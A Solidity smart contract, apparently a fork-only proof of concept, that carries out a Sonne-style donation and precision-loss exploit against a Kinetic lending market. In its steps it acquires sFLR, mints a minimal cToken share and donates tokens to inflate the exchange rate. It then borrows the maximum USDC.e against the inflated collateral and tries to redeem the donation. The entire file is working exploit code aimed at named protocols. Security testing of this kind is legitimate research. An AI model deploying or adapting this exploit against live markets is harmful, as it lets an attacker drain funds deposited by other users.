// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IComptroller, ICToken, IOracle, IERC20, IStakedFlr} from "./Interfaces.sol";

/// @notice Replicates the Sonne-style donation/precision-loss sequence against a live Kinetic market,
///         using a REAL capital path (FLR -> sFLR via StakedFlr.submit) so the P&L is meaningful.
///         Fork-only; never deployed on a real chain.
contract SonneAttacker {
    IComptroller public cmp;
    ICToken public kSFLR;
    ICToken public kUSDCE;
    IStakedFlr public sflr;

    constructor(IComptroller cmp_, ICToken kSFLR_, ICToken kUSDCE_, IStakedFlr sflr_) {
        cmp = cmp_;
        kSFLR = kSFLR_;
        kUSDCE = kUSDCE_;
        sflr = sflr_;
    }

    struct Result {
        uint256 flrIn;          // FLR spent to acquire sFLR
        uint256 sflrAcquired;   // sFLR acquired at fair rate
        uint256 minMintWei;     // sFLR deposited via mint() to obtain >=1 raw cToken wei
        uint256 sharesHeld;     // raw cToken units after mint
        uint256 sflrDonated;    // sFLR directly transferred (donation) into the cToken
        uint256 usdcBorrowed;   // USDC.e borrowed against the "inflated" collateral
        uint256 redeemRet;      // return code of redeemUnderlying donation
        uint256 sflrBack;       // sFLR balance after attempted redemption
        uint256 rateBefore;
        uint256 rateAfter;
    }

    /// @param flrIn FLR (wei) to convert into sFLR at the fair rate
    function attack(uint256 flrIn) external returns (Result memory r) {
        r.flrIn = flrIn;
        // accrue interest first so the min-mint is computed at the *current* rate
        r.rateBefore = kSFLR.exchangeRateCurrent();

        // 1) acquire sFLR at the fair rate (real capital; permissionless submit())
        sflr.submit{value: flrIn}();
        r.sflrAcquired = sflr.balanceOf(address(this));

        // 2) mint the minimum amount that still yields >= 1 raw cToken share
        r.minMintWei = r.rateBefore / 1e18 + 1;
        require(r.minMintWei <= r.sflrAcquired, "min mint > acquired");
        IERC20(address(sflr)).approve(address(kSFLR), r.minMintWei);
        uint256 e = kSFLR.mint(r.minMintWei);
        require(e == 0, "mint failed");
        r.sharesHeld = kSFLR.balanceOf(address(this));

        // 3) enter markets so the (tiny) position is collateral
        address[] memory ms = new address[](2);
        ms[0] = address(kSFLR);
        ms[1] = address(kUSDCE);
        cmp.enterMarkets(ms);

        // 4) donate the rest of the sFLR directly to the cToken (Sonne step 2)
        r.sflrDonated = sflr.balanceOf(address(this));
        IERC20(address(sflr)).transfer(address(kSFLR), r.sflrDonated);
        r.rateAfter = kSFLR.exchangeRateStored();

        // 5) borrow as much as possible of another asset against the collateral
        (, uint256 liq, ) = cmp.getAccountLiquidity(address(this));
        IOracle orc = IOracle(cmp.oracle());
        uint256 px = orc.getUnderlyingPrice(address(kUSDCE));
        uint256 maxBorrow = liq == 0 || px == 0 ? 0 : (liq * 1e36) / px;
        uint256 cash = kUSDCE.getCash();
        if (maxBorrow > cash) maxBorrow = cash;

        // retry ladder in case the first sizing is rejected (returns error code, no revert)
        uint256[4] memory fracs = [uint256(99), 90, 50, 10];
        for (uint256 i = 0; i < fracs.length; i++) {
            uint256 amt = (maxBorrow * fracs[i]) / 100;
            if (amt == 0) continue;
            if (kUSDCE.borrow(amt) == 0) {
                r.usdcBorrowed = amt;
                break;
            }
        }

        // 6) attempt the Sonne "redeemUnderlying the donation" step
        r.redeemRet = kSFLR.redeemUnderlying(r.sflrDonated);
        r.sflrBack = sflr.balanceOf(address(this));
    }
}
